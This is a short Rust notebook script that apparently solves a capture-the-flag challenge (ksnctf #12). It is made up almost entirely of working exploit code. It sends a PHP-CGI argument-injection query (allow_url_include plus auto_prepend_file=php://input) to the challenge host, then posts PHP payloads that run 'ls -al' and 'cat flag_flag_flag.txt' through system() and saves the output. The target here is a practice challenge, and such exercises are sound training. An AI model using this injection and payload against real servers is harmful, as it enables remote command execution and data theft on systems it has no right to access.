```rust
:dep reqwest = { version = "0.11", features = ["blocking"] }
use std::fs;

const TARGET_URL: &str = "http://ctfq.u1tramarine.blue/q12/";
const EXPLOIT_QUERY: &str = "?-d+allow_url_include=On+-d+auto_prepend_file=php://input";

let url = format!("{}{}", TARGET_URL, EXPLOIT_QUERY);
let client = reqwest::blocking::Client::new();

println!("=== ksnctf #12 Solver (Rust/evcxr) ===");

// Step 1: ディレクトリ一覧
let ls_payload = "<?php system('ls -al'); exit(); ?>";
let ls_res = client
    .post(&url)
    .header("Content-Type", "application/x-www-form-urlencoded")
    .body(ls_payload)
    .send()?
    .text()?;
println!("[Step 1] ls:\n{}", ls_res);

// Step 2: フラグ取得
let cat_payload = "<?php system('cat flag_flag_flag.txt'); exit(); ?>";
let flag_res = client
    .post(&url)
    .header("Content-Type", "application/x-www-form-urlencoded")
    .body(cat_payload)
    .send()?
    .text()?;
fs::write("flag.txt", flag_res).unwrap();
```
